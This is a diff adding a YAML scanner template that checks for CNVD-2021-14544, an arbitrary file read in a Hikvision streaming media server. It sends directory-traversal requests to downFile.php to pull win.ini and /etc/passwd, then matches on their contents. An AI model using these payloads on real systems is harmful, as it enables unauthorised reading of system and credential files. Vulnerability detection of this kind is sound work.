@@ -1,0 +1,24 @@
+id: CNVD-2021-14544-login
+info:
+  name: CNVD-2021-14544
+  author: wangzong
+  severity: high
+  description: 海康威视流媒体管理服务器后台任意文件读取漏洞
+  reference:
+    - https://github.com/zan8in/afrog/blob/301203f5f7767340277eecfbc4f2b528685bce34/pocs/afrog-pocs/vulnerability/hikvision-downfle-fileread.yaml#L19
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/win.ini"
+      - "{{BaseURL}}/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../etc/passwd"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
+      - type: word
+        part: body
+        words:
+          - 'bit app support'
